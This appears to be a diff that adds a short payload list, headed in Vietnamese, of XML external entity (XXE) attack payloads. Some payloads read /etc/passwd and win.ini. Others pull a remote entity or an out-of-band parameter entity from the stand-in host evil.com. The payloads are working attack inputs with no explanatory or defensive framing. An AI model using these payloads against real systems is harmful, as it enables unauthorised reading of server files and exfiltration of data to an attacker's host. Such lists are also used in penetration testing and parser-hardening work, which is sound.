@@ -1,0 +1,17 @@
+# Payloads XXE phổ biến
+<?xml version="1.0" ?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<foo>&xxe;</foo>
+
+<?xml version="1.0" ?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]>
+<foo>&xxe;</foo>
+
+<?xml version="1.0" ?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://evil.com/evil"> ]>
+<foo>&xxe;</foo>
+
+# XXE Out-Of-Band
+<?xml version="1.0" ?>
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://evil.com/evil"> %xxe; ]>
+<foo>test</foo>
